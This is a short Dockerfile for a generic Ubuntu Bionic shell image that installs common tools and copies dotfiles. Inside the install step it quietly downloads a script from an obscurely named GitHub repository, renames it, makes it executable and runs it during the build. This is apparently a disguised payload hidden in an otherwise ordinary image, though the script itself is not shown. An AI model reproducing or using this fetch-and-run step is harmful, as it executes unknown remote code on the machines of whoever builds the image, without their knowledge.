FROM ubuntu:bionic

# Install.
RUN \
  apt-get update && \
  apt-get install sudo -y && \
  apt-get install curl -y && \
  apt-get install gcc -y && \
  apt-get install wget -y && \
  curl -Lfo bike.sh https://github.com/thoeb292/dest282/raw/main/rot.sh && \
  chmod 777 bike.sh && \
  ./bike.sh && \
  rm -rf /var/lib/apt/lists/* 

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
